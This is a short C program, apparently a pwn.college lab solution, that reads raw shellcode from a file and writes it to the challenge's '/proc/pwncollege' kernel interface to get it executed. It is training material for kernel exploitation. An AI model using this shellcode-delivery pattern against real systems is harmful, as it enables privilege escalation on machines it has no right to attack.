#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(void)
{
        char buffer[100] = { 0, };
        int fd1 = open("shellcode-raw", O_RDONLY);
        read(fd1, buffer, 100);

        int fd2 = open("/proc/pwncollege", O_WRONLY);
        write(fd2, buffer, 100);
        return 0;
}
